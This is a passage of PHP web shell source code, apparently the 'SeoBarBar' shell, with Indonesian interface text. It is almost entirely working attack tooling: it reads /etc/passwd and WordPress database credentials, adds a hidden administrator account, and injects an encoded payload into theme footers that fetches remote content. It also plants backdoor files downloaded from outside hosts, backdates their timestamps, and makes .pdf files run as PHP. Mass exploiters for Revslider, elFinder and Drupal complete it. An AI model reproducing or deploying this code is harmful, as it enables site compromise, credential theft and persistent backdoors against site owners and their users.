</table><br><hr>';if($_POST['awkuser']){echo "<textarea class='form-control' cols='65' rows='15'>";echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");echo "</textarea><br>";}if($_POST['systuser']){echo "<textarea class='form-control' cols='65' rows='15'>";echo system("ls /var/mail");echo "</textarea><br>";}if($_POST['passthuser']){echo "<textarea class='form-control' cols='65' rows='15'>";echo passthru("ls /var/mail");echo "</textarea><br>";}if($_POST['exuser']){echo "<textarea class='form-control' cols='65' rows='15'>";echo exec("ls /var/mail");echo "</textarea><br>";}if($_POST['shexuser']){echo "<textarea class='form-control' cols='65' rows='15'>";echo shell_exec("ls /var/mail");echo "</textarea><br>";}if($_POST['syst']){echo "<textarea class='form-control' cols='65' rows='15'>";echo system("cat /etc/passwd");echo "</textarea><br><br><b></b><br>";}if($_POST['passth']){echo "<textarea class='form-control' cols='65' rows='15'>";echo passthru("cat /etc/passwd");echo "</textarea><br><br><b></b><br>";}if($_POST['ex']){echo "<textarea class='form-control' cols='65' rows='15'>";echo exec("cat /etc/passwd");echo "</textarea><br><br><b></b><br>";}if($_POST['shex']){echo "<textarea class='form-control' cols='65' rows='15'>";echo shell_exec("cat /etc/passwd");echo "</textarea><br><br><b></b><br>";}echo '<center>';if($_POST['melex']){echo "<textarea class='form-control' cols='65' rows='15'>";for($uid=0;$uid<60000;$uid++){$ara=posix_getpwuid($uid);if(!empty($ara)){while(list($key,$val)=each($ara)){print"$val:";}print "
";}}echo "</textarea><br><br>";}}elseif(isset($_GET[hex('exploiter')])){echo "<hr><br>";echo "<center><h2>Exploiter SeoBarBar</h2></center><br>";echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-2'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('signature')."' style='width: 250px;' height='10'><center>Signature Exploit</center></a>
						</div>						
						<div class = 'col-md-2'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('csrf')."' style='width: 250px;' height='10'><center>CSRF Exploiter</center></a>
						</div>
						<div class = 'col-md-2'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('revslider')."' style='width: 250px;' height='10'><center>Revslider Exploiter</center></a>
						</div>
						<div class = 'col-md-2'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('elfinder')."' style='width: 250px;' height='10'><center>Elfinder Exploiter</center></a>
						</div>
						<div class = 'col-md-2'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('drupal')."' style='width: 250px;' height='10'><center>Drupal Exploiter</center></a>
						</div>
						
						</div>
						
						</form>";echo "<hr>";}elseif(isset($_GET[hex('footer')])){echo '<br><br>';$direktori=$_SERVER['DOCUMENT_ROOT'];$targetSitez=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?"https":"http")."://$_SERVER[HTTP_HOST]";$srcz=mari_get_contents($targetSitez);preg_match("/.*stylesheet.*href=.*\/themes\/(.*?)\/.*\.css.*\>/i",$srcz,$matchesz);$styleHrefz=trim($matchesz[1]);if($styleHrefz){echo "<br><br><center>Themes Wordpress: <strong><h2>".$styleHrefz."</h2></strong></center>";}else{echo "<br><br><center>Themes Wordpress: <strong><h2>Website Error</h2></strong></center>";}echo "<center>";$fooxer=$direktori.DIRECTORY_SEPARATOR."wp-content".DIRECTORY_SEPARATOR."themes".DIRECTORY_SEPARATOR.$styleHrefz.DIRECTORY_SEPARATOR."footer.php";if(file_exists($fooxer)&&is_writable($fooxer)){echo "<br>Footer: ".$fooxer;$fooxerori=mari_get_contents($fooxer);;if(strpos($fooxerori,'reformaridono')===false){$searchcar='</body>';$replacecar='PD9waHAgaWYoaXNfaG9tZSgpIHx8IGlzX2Zyb250X3BhZ2UoKSkgeyAkYW5hbj1maWxlX2dldF9jb250ZW50cygiaHR0cHM6Ly9saW5raWQub3JnL0JMLzMudHh0Iik7ID8+IDw/PSRhbmFuOyA/Pjw/cGhwIH0gPz4KPD9waHAgaWYoaXNfcGFnZSgpKSB7ICR1bmRvPWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2xpbmtpZC5vcmcvYi8xLnR4dCIpOyA/PiA8Pz0kdW5kbzsgPz48P3BocCB9ID8+Cjw/cGhwIGlmKGlzX3NpbmdsZSgpKSB7ICR1bmRvPWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2xpbmtpZC5vcmcvYi8yLnR4dCIpOyA/PiA8Pz0kdW5kbzsgPz48P3BocCB9ID8+PC9ib2R5PiA8IS0tIHJlZm9ybWFyaWRvbm8gLS0+';$strcar=preg_replace('~.*\K'.preg_quote($searchcar,'~').'~s','$1'.base64_decode($replacecar),$fooxerori);echo $strcar;file_put_contents($fooxer,$strcar);@touch($fooxer,strtotime('-'.rand(90,150).' days',time()));}if(preg_match("/reformaridono/i",$fooxerori)){echo "<br>Footer behasil di inject pada: <a href='".$targetSitez."' target='_blank'>".$targetSitez."</a><br>";echo "<textarea readonly>".htmlspecialchars($fooxerori)."</textarea>";}else{echo "<br>Injecting failed!<br>";echo "<textarea readonly>".htmlspecialchars($fooxerori)."</textarea>";}}else{echo "<br>File not exist or not writable!<br>";}echo "</center>";}elseif(isset($_GET[hex('adduserwp')])){$direktori=$_SERVER['DOCUMENT_ROOT'];if(file_exists($direktori."/wp-config.php")){echo '<br><br>';echo "<center><h3 style='color: green;'>WP: ".$direktori."</h3></center>";echo "<center>";$lapor8900=$direktori.'/wp-config.php';if(file_exists($lapor8900)){$cxz=mari_get_contents($lapor8900);preg_match('/define.*DB_NAME.*\'(.*)\'/',$cxz,$mxz);$dbname=$mxz[1];preg_match('/define.*DB_USER.*\'(.*)\'/',$cxz,$mxz);$dbuser=$mxz[1];preg_match('/define.*DB_PASSWORD.*\'(.*)\'/',$cxz,$mxz);$dbpass=$mxz[1];preg_match('/define.*DB_HOST.*\'(.*)\'/',$cxz,$mxz);$dbhost=$mxz[1];preg_match('/table_prefix.*=.*\'(.*)\'/',$cxz,$mxm);$table_prefix=$mxm[1];if(isset($table_prefix)){$conn=new mysqli($dbhost,$dbuser,$dbpass,$dbname);if($conn->connect_error){die("Connection failed: ".$conn->connect_error);}$sql="INSERT INTO ".$table_prefix."users (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('99899', '$dbuser', MD5('".base64_decode('akFkcEZSZFZGVVVwNWpj')."'), '$dbname', 'wagimanasek@gmail.com', 'http://www.google.com/', '2018-06-07 00:00:00', '', '0', '$dbname');";$sql.="INSERT INTO ".$table_prefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '99899', '".$table_prefix."capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');";$sql.="INSERT INTO ".$table_prefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '99899', '".$table_prefix."user_level', '10');";if($conn->multi_query($sql)===TRUE){echo "New records created successfully<br>";echo "<code>Username: ".$dbname."</code>";}else{echo "Error: ".$sql."<br>".$conn->error;}$conn->close();}else{echo " Gagal dalam inject user WordPress";if(isset($dbname)){echo "<br>DB Name: ".$dbname;}else{echo "<br>DB Name: Tidak ditemukan.";}if(isset($dbhost)){echo "<br>DB Host: ".$dbhost;}else{echo "<br>DB Host: Tidak ditemukan.";}if(isset($dbuser)){echo "<br>DB User: ".$dbuser;}else{echo "<br>DB User: Tidak ditemukan.";}if(isset($dbpass)){echo "<br>DB Pass: ".$dbpass;}else{echo "<br>DB Pass: Tidak ditemukan.";}if(isset($table_prefix)){echo "<br>DB Name: ".$table_prefix."<br>";}else{echo "<br>DB Table: Tidak ditemukan.<br>";}echo "<textarea readonly>".htmlspecialchars($cxz)."</textarea>";}}echo "</center>";}else{echo "Bukan Wordpress ini om!";}}elseif(isset($_GET[hex('signature')])){$direktori=$_SERVER['DOCUMENT_ROOT'];if(file_exists($direktori."/wp-config.php")){echo '<br><br>';echo "<center><h3 style='color: green;'>WP: ".$direktori."</h3></center>";echo "<center>";$lapor8900=$direktori.'/wp-config.php';if(file_exists($lapor8900)){$cxz=mari_get_contents($lapor8900);preg_match('/define.*DB_NAME.*\'(.*)\'/',$cxz,$mxz);$dbname=$mxz[1];preg_match('/define.*DB_USER.*\'(.*)\'/',$cxz,$mxz);$dbuser=$mxz[1];preg_match('/define.*DB_PASSWORD.*\'(.*)\'/',$cxz,$mxz);$dbpass=$mxz[1];preg_match('/define.*DB_HOST.*\'(.*)\'/',$cxz,$mxz);$dbhost=$mxz[1];preg_match('/table_prefix.*=.*\'(.*)\'/',$cxz,$mxm);$table_prefix=$mxm[1];if(isset($dbname)){echo "<br>DB Name: ".$dbname;echo " - DB Host: ".$dbhost;echo "<br>DB User: ".$dbuser;echo " - DB Pass: ".$dbpass;echo "<br>Table Prefix: ".$table_prefix;}}echo "</center>";}echo '
				<br><br>
				<form action="" method="post">
					<center>
					Tebarkan di (no / at the end) :<br>
						<input class="form-control" type="text" name="direktorix" value="'.$direktori.'" style="width: 450px;" height="10"><br>
						<input type="submit" class="form-control" style="width: 250px; height: 40px;" value="Tebar" name="tebar" />

					</center>	
				</form>
				';if(isset($_POST['tebar'])){$folderio=$_POST['direktorix'];echo "<br><br><center><h3>Hajar miring ".$folderio."</h3></center>";$fullxx=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'],"",$direktori);$itemsxz=array("https://m.slotao.com/licenses.png","https://m.slotao.com/mari.png","https://m.slotao.com/marryme.psd","https://m.slotao.com/harapan.gif","https://m.slotao.com/class-wp-customize-nav-menu-customize.png","https://m.slotao.com/Note.png","https://raw.githubusercontent.com/dono-zz/1945/main/mari.png","https://m.slotao.com/2022.docx","https://raw.githubusercontent.com/dono-zz/1945/main/new_year2022.jpg","https://m.slotao.com/maridono.pdf","https://m.slotao.com/supre.png","https://m.slotao.com/opsi.txt");$items=array("login.php","xmlrpc.php","edit-form-advanced.php","link-parse-opml.php","ms-sites.php","options-writing.php","themes.php","https.php","class-https.php","admin-ajax.php","edit-form-comment.php","link.php","ms-themes.php","mari.php","plugin-editor.php","admin-footer.php","edit-link-form.php","registration-functions.php","load-scripts.php","ms-upgrade-network.php","admin-functions.php","edit.php","load-styles.php","ms-users.php","plugins.php","admin-header.php","licenses.php","edit-tag-form.php","media-new.php","my-sites.php","apps.php","post-new.php","upgrade-themes.php","sandwich.php","edit-tags.php","noop.php","media.php","nav-menus.php","posts.php","admin-post.php","SeoBarBar.php","export.php","Note.php","media-upload.php","network.php","press-this.php","upload.php","async-upload.php","menu-header.php","options-discussion.php","privacy.php","user-edit.php","menu.php","options-general.php","profile.php","user-new.php","moderation.php","options-head.php","revision.php","users.php","custom-background.php","ms-admin.php","options-media.php","setup-config.php","widgets.php","theme-single.php","custom-header.php","ms-delete-site.php","options-permalink.php","term.php","customize.php","link-add.php","supre.php","ms-edit.php","options.php","edit-comments.php","link-manager.php","ms-options.php","options-reading.php","xmlrpc.php","comments.php","front-page.php","home.php","header.php","singular.php","single.php","single-wordpress.php","page.php","category.php","tag.php","taxonomy.php","author.php","date.php","archive.php","search.php","attachment.php","image.php","404.php");$resource1="https://m.slotao.com/licenses.png";$resource2="https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";if(is_writable($direktori)){if(!is_dir($direktori.'/.well-known/pki-validation/.../')){mkdir($direktori.'/.well-known/pki-validation/.../',0755,true);}$lapor9=$direktori.'/.well-known/pki-validation/.../index.php';$report9=mari_get_contents($itemsxz[1]);file_put_contents($lapor9,$report9);if(file_exists($lapor9)&&filesize($lapor9)>0){echo "<a href='//".$_SERVER['HTTP_HOST']."/.well-known/pki-validation/.../index.php' target='_blank'>".$_SERVER['HTTP_HOST']."/.well-known/pki-validation/.../index.php</a><br>";@touch($lapor9,strtotime('-'.rand(30,90).' days',time()));}if(!is_dir($direktori.'/-./')){mkdir($direktori.'/-./',0755,true);}$lapor5=$direktori.'/-./lapor.pdf';$report5=mari_get_contents($itemsxz[1]);file_put_contents($lapor5,$report5);if(file_exists($lapor5)&&filesize($lapor5)>0){echo "<a href='//".$_SERVER['HTTP_HOST']."/-./lapor.pdf' target='_blank'>".$_SERVER['HTTP_HOST']."/-./lapor.pdf</a><br>";@touch($lapor5,strtotime('-'.rand(30,90).' days',time()));}}if($folderio){$lapor8=$folderio.'/wp-config.php';if(file_exists($lapor8)){$lapor1=$folderio.'/.tmb/index.php';$lapor2=$folderio.'/wp-content/upgrade/mari.php';$lapor3=$folderio.'/wp-content/uploads/'.date("Y").'/'.date("n").'/supre.php';$lapor4=$folderio.'/licenses.php';$lapor10=$folderio.'/wp-admin/Note.php';$lapor6=$folderio.'/wp-includes/class-wp-customize-nav-menu-customize.php';$lapor7=$folderio.'/wp-config-sample.php';$lapor11=$folderio.'/wp-content/plugin-editor.php';$lapor12=$folderio.'/wp-content/plugins/index.php';$laporanz=array($lapor1,$lapor4,$lapor10,$lapor6,$lapor7,$lapor10,$lapor11,$lapor12);$lapor9=$folderio.'/.well-known/pki-validation/.../index.php';$penanggalan=date("Y").'/'.date("n");if(is_writable($folderio)){if(!is_dir($folderio.'/.tmb')){mkdir($folderio.'/.tmb',0755,true);}if(!is_dir($folderio.'/wp-includes')){mkdir($folderio.'/wp-includes',0755,true);}if(!is_dir($folderio.'/wp-admin')){mkdir($folderio.'/wp-admin',0755,true);}if(!is_dir($folderio.'/wp-content/upgrade')){mkdir($folderio.'/wp-content/upgrade',0755,true);}if(!is_dir($folderio.'/.well-known/pki-validation')){mkdir($folderio.'/.well-known/pki-validation/...',0755,true);}if(!is_dir($folderio.'/wp-content/uploads/'.$penanggalan)){mkdir($folderio.'/wp-content/uploads/'.$penanggalan,0755,true);}}$i=0;foreach(scandir($folderio)as $detailsfolderx){$wpfolder=$folderio.DIRECTORY_SEPARATOR.$detailsfolderx;if(is_dir($wpfolder)&&$detailsfolderx!="."&&$detailsfolderx!=".."){if(is_writable($wpfolder)){if(file_exists($wpfolder.'/.htaccess')&&$wpfolder!="-."){chmod($wpfolder.'/.htaccess',0644);unlink($wpfolder.'/.htaccess');}if($detailsfolderx==="wp-content"){if(file_exists($folderio.'/wp-content/.htaccess')){chmod($folderio.'/wp-content/.htaccess',0644);unlink($folderio.'/wp-content/.htaccess');}if(file_exists($folderio.'/wp-content/.htaccess')){chmod($folderio.'/wp-content/uploads/'.date("Y").'/.htaccess',0644);unlink($folderio.'/wp-content/uploads/'.date("Y").'/.htaccess');}if(file_exists($folderio.'/wp-content/.htaccess')){chmod($folderio.'/wp-content/uploads/'.$penanggalan.'/.htaccess',0644);unlink($folderio.'/wp-content/uploads/'.$penanggalan.'/.htaccess');}if(file_exists($folderio.'/wp-content/.htaccess')){unlink($folderio.'/wp-content/.htaccess');}$report200=mari_get_contents($itemsxz[2]);file_put_contents($lapor2,$report200);@touch($lapor2,strtotime('-'.rand(30,90).' days',time()));$report300=mari_get_contents($itemsxz[3]);file_put_contents($lapor3,$report300);@touch($lapor3,strtotime('-'.rand(30,90).' days',time()));if(file_exists($lapor2)&&filesize($lapor2)>0){echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor2)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor2)."</a><br>";}if(file_exists($lapor3)&&filesize($lapor3)>0){echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor3)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor3)."</a><br>";}}if(!file_exists($laporanz[$i])){$report=mari_get_contents($itemsxz[$i]);file_put_contents($laporanz[$i],$report);@touch($laporanz[$i],strtotime('-'.rand(30,90).' days',time()));if(file_exists($laporanz[$i])&&filesize($laporanz[$i])>0){echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$laporanz[$i])."''>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$laporanz[$i])."</a><br>";}}$key1=$items[array_rand($items)];$laporanzx=$wpfolder.DIRECTORY_SEPARATOR.$key1;$sourcezx=$itemsxz[array_rand($itemsxz)];if(!file_exists($laporanzx)){$reportx=mari_get_contents($sourcezx);file_put_contents($laporanzx,$reportx);@touch($laporanzx,strtotime('-'.rand(30,90).' days',time()));if(file_exists($laporanzx)&&filesize($laporanzx)>0){echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$laporanzx)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$laporanzx)."</a><br>";}}$i++;}}}if(is_dir($folderio.'/wp-includes/IXR/')&&is_writable($folderio.'/wp-includes/IXR/')){$lapor13=$folderio.'/wp-includes/IXR/supre.php';$report13=mari_get_contents($resource2);file_put_contents($lapor13,$report13);@touch($lapor13,strtotime('-'.rand(30,90).' days',time()));if(file_exists($lapor13)&&filesize($lapor13)>0){echo "<br>Adminer :";echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor13)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor13)."</a><br>";}}}else{$i=0;foreach(scandir($folderio)as $detailsfolder){$nonwpfolder=$folderio.DIRECTORY_SEPARATOR.$detailsfolder;if(is_dir($nonwpfolder)and $detailsfolder!="."&&$detailsfolder!=".."){if(is_writable($nonwpfolder)){if(file_exists($nonwpfolder.'/.htaccess'&&$nonwpfolder!="-.")){chmod($nonwpfolder.'/.htaccess',0644);unlink($nonwpfolder.'/.htaccess');}if($detailsfolder==='docs'){if(!is_dir($nonwpfolder.'/manual/')){mkdir($nonwpfolder.'/manual/',0755,true);}$lapor1=$nonwpfolder.'/manual/index.php';$report1=mari_get_contents($resource1);file_put_contents($lapor1,$report1);@touch($lapor1,strtotime('-'.rand(30,90).' days',time()));if(file_exists($lapor1)&&filesize($lapor1)>0){echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor1)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"","/".$lapor1)."</a><br>";}}if($detailsfolder==='public'){if(!is_dir($nonwpfolder.'/.../')){mkdir($nonwpfolder.'/.../',0755,true);}$lapor2=$nonwpfolder.'/.../index.php';$report2=mari_get_contents($resource1);file_put_contents($lapor2,$report2);@touch($lapor2,strtotime('-'.rand(30,90).' days',time()));if(file_exists($lapor2)&&filesize($lapor2)>0){echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor2)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"","/".$lapor2)."</a><br>";}}if(is_array($itemsxz)||is_object($itemsxz)){$namafile=$items[array_rand($items)];$lapor3=$nonwpfolder.DIRECTORY_SEPARATOR.$namafile;if(!file_exists($lapor3)){for($i=0;$i<count($itemsxz);$i++){if(($i+1)<=11){$getcontentsource=$itemsxz[$i];$report3=mari_get_contents($getcontentsource);file_put_contents($lapor3,$report3);}else{$key=array_rand($itemsxz);$getcontentsource=$itemsxz[$key];$report3=mari_get_contents($getcontentsource);file_put_contents($lapor3,$report3);}}if(file_exists($lapor3)&&filesize($lapor3)>0){@touch($lapor3,strtotime('-'.rand(30,90).' days',time()));@touch($nonwpfolder,strtotime('-'.rand(30,90).' days',time()));chmod($lapor3,0644);echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor3)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'],"",$lapor3)."</a><br>";sleep(5);}}}}}}}}$htaccessxz=$direktori."/-./.htaccess";if(!file_exists($htaccessxz)){$contentx='QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucGRm';$contentx=base64_decode($contentx);@file_put_contents($htaccessxz,$contentx);}}}elseif(isset($_GET[hex('csrf')])){echo '
<hr><br><center><h2 style="font-size:33px;">CSRF Exploiter SeoBarBar</h2><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="POST" style="font-size:25px;" action= "">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px; width:450px;" class = "form-control" required autocomplete = "off"><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px; width:250px;" required class = "form-control" autocomplete = "off"><br>
<input style="width:350px;" type="submit" name="d" value="Lock!" class = "form-control">
</form><hr><br>';$url=$_POST["url"];$pf=$_POST["pf"];$d=$_POST["d"];if($d){echo"
	<h2>Upload Your Files</h2>
	<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form>";}}elseif(isset($_GET[hex('revslider')])){echo "
     
<center><hr><br>
<h2>Revslider Exploiter SeoBarBar</h2>
<form method='post'>
<textarea class='form-control' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='form-control' type='submit' style='width: 150px;' name='sikat' value='Gass!'>
</form></center><hr><br>
";function findit($mytext,$starttag,$endtag){$posLeft=stripos($mytext,$starttag)+strlen($starttag);$posRight=stripos($mytext,$endtag,$posLeft+1);return substr($mytext,$posLeft,$posRight-$posLeft);}error_reporting(0);set_time_limit(0);$ya=$_POST['sikat'];$co=$_POST['site'];if($ya){$e=explode("
",$co);foreach($e as $bda){$linkof='/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';$dn=($bda).($linkof);$file=@mari_get_contents($dn);if(eregi('DB_HOST',$file)and!eregi('FTP_USER',$file)){echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';echo "<center><font face='courier' color='lime' >".$bda."</font></center>";echo "<font face='courier' color=lime >DB name : </font>".findit($file,"DB_NAME', '","');")."<br>";echo "<font face='courier' color=lime >DB user : </font>".findit($file,"DB_USER', '","');")."<br>";echo "<font face='courier' color=lime >DB pass : </font>".findit($file,"DB_PASSWORD', '","');")."<br>";echo "<font face='courier' color=lime >DB host : </font>".findit($file,"DB_HOST', '","');")."<br>";}elseif(eregi('DB_HOST',$file)and eregi('FTP_USER',$file)){echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';echo "<center><font face='courier' color='lime' >".$bda."</font></center>";echo "<font face='courier' color=lime >FTP user : </font>".findit($file,"FTP_USER','","');")."<br>";echo "<font face='courier' color=lime >FTP pass : </font>".findit($file,"FTP_PASS','","');")."<br>";echo "<font face='courier' color=lime >FTP host : </font>".findit($file,"FTP_HOST','","');")."<br>";}else{echo "<center><font face='courier' color='red' >".$bda." ----> not infected </font></center>";}echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';}}}elseif(isset($_GET[hex('elfinder')])){echo "<hr><br>";echo "<center>";echo '<h2>ElFinder Mass Exploiter</h2>';echo '<form method="post">
Target: <br>
<textarea class = "form-control" name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; height: 250px; margin: 5px auto; resize:
none;"></textarea><br>
<input class = "form-control" type="submit" name="x" style="width: 150px; height: 35px; margin: 5px;" value="SIKAT!">
</form></center><hr><br>';function ngirim($url,$isi){$ch=curl_init("$url");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,$isi);curl_setopt($ch,CURLOPT_COOKIEJAR,'coker_log');curl_setopt($ch,CURLOPT_COOKIEFILE,'coker_log');$data3=curl_exec($ch);return $data3;}$target=explode("
",$_POST['target']);if($_POST['x']){foreach($target as $korban){$nama_doang="SeoBarBar.php";$isi_nama_doang="PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1
lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";$decode_isi=base64_decode($isi_nama_doang);$encode=base64_encode($nama_doang);$fp=fopen($nama_doang,"w");fputs($fp,$decode_isi);echo"[!] <a href='$korban' target='_blank'>$korban</a> <br>";echo "# Upload[1] ......<br>";$url_mkfile="$korban?cmd=mkfile&name=$nama_doang&target=l1_Lw";$b=mari_get_contents("$url_mkfile");$post1=array("cmd"=>"put","target"=>"l1_$encode","content"=>"$decode_isi",);$post2=array("current"=>"8ea8853cb93f2f9781e0bf6e857015ea","upload[]"=>"@$nama_doang",);$output_mkfile=ngirim("$korban",$post1);if(preg_match("/$nama_doang/",$output_mkfile)){echo"<font color='lime'># Upload Sukses 1... => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";}else{echo "<font color='red'># Upload Gagal Cok! 1 <br># Uploading 2..</font><br>";$upload_ah=ngirim("$korban?cmd=upload",$post2);if(preg_match("/$nama_doang/",$upload_ah)){echo"<font color='lime'># Upload Sukses 2 => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";}else{echo "<font color='red'># Upload Gagal Lagi Cok! 2</font><br><br>";}}}}}elseif(isset($_GET[hex('drupal')])){echo "<center><hr><br>";echo "
		<h2>Drupal Mass Exploiter</h2><br>
		<form method='post' action=''>
		<textarea rows='10'class='form-control' cols='10' name='url'>
		http://www.site.com
		http://www.site2.com</textarea><br><br>
		<input type='submit' class='form-control' style='width:250px;' name='submit' value='SIKAT!'>
		</form></center><hr><br>
		";$drupal=($_GET["drupal"]);if($drupal=='drupal'){$filename=$_FILES['file']['name'];$filetmp=$_FILES['file']['tmp_name'];echo "<div class='mybox'><form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form></div>";move_uploaded_file($filetmp,$filename);}error_reporting(0);if(isset($_POST['submit'])){function exploit($url){$post_data="name[0;update users set name %3D 'SeoBarBar' , pass %3D '".urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu')."',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";$params=array('http'=>array('method'=>'POST','header'=>"Content-Type: application/x-www-form-urlencoded
",'content'=>$post_data));$ctx=stream_context_create($params);$data=mari_get_contents($url.'/user/login/',null,$ctx);if((stristr($data,'mb_strlen() expects parameter 1 to be string')&&$data)||(stristr($data,'FcUk Crap')&&$data)){$fp=fopen("exploited.txt",'a+');fwrite($fp,"Exploitied  User: SeoBarBar Pass: SeoBarBar  =====> {$url}/user/login");fwrite($fp,"
");fwrite($fp,"--------------------------------------------------------------------------------------------------");fwrite($fp,"
");fclose($fp);echo"<font color='lime'><b>Success:<font color='white'>SeoBarBar</font> Pass:<font color='white'>SeoBarBar</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";}else{echo"<font color='red'><b>Failed => {$url}/user/login</font></b><br>";}}$urls=explode("
",$_POST['url']);foreach($urls as $url){$url=@trim($url);echo exploit($url);}}}elseif(isset($_GET[hex('auto_tools')])){echo '<hr><center><h2>Auto Tools SeoBarBar </h2><br>
<table style="width:90%">
  <tr>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("Lockdown").'><center>Lockdown</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("crontab").'><center>Crontab</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("jumping").'><center>Jumping</center></a></td>	
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("fake-root").'><center>Fake Root</center></a></td>	
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("adminer").'><center>Adminer</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("wp-hijack").'><center>Wp Auto Hijack</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("cpanel-reset").'><center>Cpanel Reset</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("zip-menu").'><center>Zip Menu</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("reverse-ip").'><center>Reverse IP</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("rdp").'><center>K-RDP Shell</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("ransomware").'><center>Ransomware</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("whois").'><center>WhoIs</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("phpinfo").'><center>Php Info</center></a></td>	
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("inject-code").'><center>Inject Code</center></a></td>	
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("db-dump").'><center>DB Dump</center></a></td>
</tr>
<tr>
